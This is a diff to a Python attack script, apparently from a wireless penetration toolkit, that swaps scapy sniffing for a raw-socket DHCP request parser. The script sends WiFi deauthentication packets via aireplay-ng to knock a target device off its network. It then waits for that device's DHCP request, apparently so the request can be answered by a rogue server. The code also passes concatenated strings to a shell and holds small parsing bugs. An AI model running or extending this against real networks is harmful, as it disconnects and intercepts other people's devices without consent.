@@ -13,6 +13,8 @@ path.append(scripts_arp_path)
 from base import Base
 from scanner import Scanner
 from tm import ThreadManager
+from network import Ethernet_raw, IP_raw, UDP_raw, DHCP_raw
+from socket import socket, AF_PACKET, SOCK_RAW, htons
 from arp_scan import ArpScan
 from os import path, errno, makedirs, stat
 from shutil import copyfile, copytree
@@ -21,7 +23,6 @@ from argparse import ArgumentParser
 from sys import exit, stdout
 from time import sleep
 from ipaddress import IPv4Address
-from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
 import re
 # endregion
 
@@ -207,20 +208,105 @@ def dhcp_request_sniffer_prn(request):
     global Base
 
     # This request is DHCP
-    if request.haslayer(DHCP):
+    if 'DHCP' in request.keys():
 
         # Kill aireply-ng
         sleep(2)
         sniff_dhcp_request = True
         Base.kill_process_by_name('aireplay-ng')
+
 # endregion
 
 
 # region DHCP Request sniffer function
 def dhcp_request_sniffer():
-    sniff(lfilter=lambda d: d.src == target_mac_address,
-          filter="udp and src port 68 and dst port 67",
-          prn=dhcp_request_sniffer_prn, iface=listen_network_interface)
+
+    # region Sniff network
+
+    # region Create RAW socket for sniffing
+    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    # endregion
+
+    # region Local variables
+    eth = Ethernet_raw()
+    ip = IP_raw()
+    udp = UDP_raw()
+    dhcp = DHCP_raw()
+
+    ethernet_header_length = 14
+    udp_header_length = 8
+    # endregion
+
+    # region Start sniffing
+    while True:
+
+        # region Get packets from RAW socket
+        packets = rawSocket.recvfrom(2048)
+
+        for packet in packets:
+
+            # region Get Ethernet header from packet
+            ethernet_header = packet[0:ethernet_header_length]
+            ethernet_header_dict = eth.parse_header(ethernet_header)
+            # endregion
+
+            # region Success parse Ethernet header
+            if ethernet_header_dict is not None:
+
+                # region DHCP packet
+
+                # 2048 - Type of IP packet (0x0800)
+                if ethernet_header_dict['type'] == 2048:
+
+                    # Get IP header
+                    ip_header = packet[ethernet_header_length:]
+                    ip_header_dict = ip.parse_header(ip_header)
+
+                    # Success parse IP header
+                    if ip_header_dict is not None:
+
+                        # UDP
+                        if ip_header_dict['protocol'] == 17:
+
+                            # Get UDP header offset
+                            udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)
+
+                            # Get UDP header
+                            udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
+                            udp_header_dict = udp.parse_header(udp_header)
+
+                            # Success parse UDP header
+                            if udp_header is not None:
+                                if udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67:
+
+                                    # Get DHCP header offset
+                                    dhcp_packet_offset = udp_header_offset + udp_header_length
+
+                                    # Get DHCP packet
+                                    dhcp_packet = packet[dhcp_packet_offset:]
+                                    dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)
+
+                                    # Create full request
+                                    request = {
+                                        "Ethernet": ethernet_header_dict,
+                                        "IP": ip_header_dict,
+                                        "UDP": udp_header_dict
+                                    }
+                                    request.update(dhcp_packet_dict)
+
+                                    # Reply to this request
+                                    dhcp_request_sniffer_prn(request)
+
+                # endregion
+
+            # endregion
+
+        # endregion
+
+    # endregion
+
+    # endregion
+
 # endregion
 
 
@@ -233,7 +319,7 @@ def deauth_packets_send():
     sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel], shell=True)
     Base.print_info("Send WiFi deauth packets ...")
 
-    deauth_packets_number = 5
+    deauth_packets_number = 3
     while not sniff_dhcp_request:
         try:
             aireplay_process = sub.Popen(['aireplay-ng ' + deauth_network_interface +
